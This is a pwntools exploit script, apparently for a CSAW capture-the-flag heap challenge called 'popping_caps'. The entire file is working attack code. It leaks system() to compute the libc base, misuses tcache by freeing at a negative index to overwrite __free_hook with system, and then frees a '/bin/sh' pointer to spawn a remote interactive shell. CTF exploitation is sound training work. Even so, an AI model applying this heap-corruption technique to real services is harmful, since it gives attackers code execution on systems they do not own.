from pwn import *
context.log_level = 'debug'

TARGET = './popping_caps'
LIBC = './libc.so.6'
HOST = 'pwn.chal.csaw.io'
PORT = 1008

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

gdb.attach(r, '''
c
''')
elf = ELF(TARGET)
libc = ELF(LIBC)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def alloc(size):
    r.sendline('1')
    r.sendlineafter('many:', str(size))
    r.recvuntil('choice: \n')

def free(idx):
    r.sendline('2')
    r.sendlineafter('free:', str(idx))
    r.recvuntil('choice: \n')

def write(data):
    r.sendline('3')
    r.sendafter('in:', data)
    r.recvuntil('choice: \n')

r.recvuntil('system ')
system = int(r.recvuntil('\n')[:-1], 16)
dbg("system")
base = system - libc.sym['system']
binsh = base + next(libc.search("/bin/sh"))
dbg("binsh") 

malloc_hook = base + 0x3ebc30
free_hook = base + 0x3ed8e8
dbg("base") 
gadget = [0x4f2c5, 0x4f322, 0x10a38c]

r.recvuntil('choice: \n')

alloc(0x20)
free(-0x250) #2
# pause()
alloc(0x240) #4
write("/bin/sh\x00"+p64(0)*7+p64(free_hook)[:6])
alloc(0x18)
write(p64(system).strip('\x00'))
# pause()
r.sendline('2')
r.sendlineafter('free:', str(binsh-free_hook))

r.interactive()
r.close()
